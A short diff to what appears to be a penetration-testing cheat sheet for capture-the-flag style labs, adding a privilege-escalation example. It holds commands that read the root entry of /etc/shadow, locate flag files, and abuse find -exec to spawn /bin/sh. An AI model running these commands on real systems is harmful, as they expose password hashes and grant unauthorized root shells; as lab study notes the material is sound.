@@ -129,3 +129,9 @@ Collect root password
     # cat /etc/shadow |grep root
 
 Find and display the proof.txt or flag.txt - LOOT! `cat ``find / -name proof.txt -print```
+
+
+----------------------- PrivEx examples -----------------------
+Find Command
+    touch test
+    find test -exec "/bin/sh" \;
